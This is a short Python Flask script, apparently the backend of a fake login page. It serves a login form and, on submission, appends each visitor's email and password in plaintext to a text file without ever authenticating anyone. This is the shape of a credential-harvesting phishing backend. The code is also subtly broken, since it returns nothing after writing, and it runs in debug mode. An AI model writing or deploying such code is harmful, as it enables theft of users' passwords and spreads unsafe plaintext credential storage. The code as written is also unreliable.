from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']

        with open("data.txt", "a") as f:
            f.write(f"Email: {email}, Mot de passe: {password}\n")
            return
    return render_template('login.html')

if __name__ == '__main__':
    app.run(debug=True)
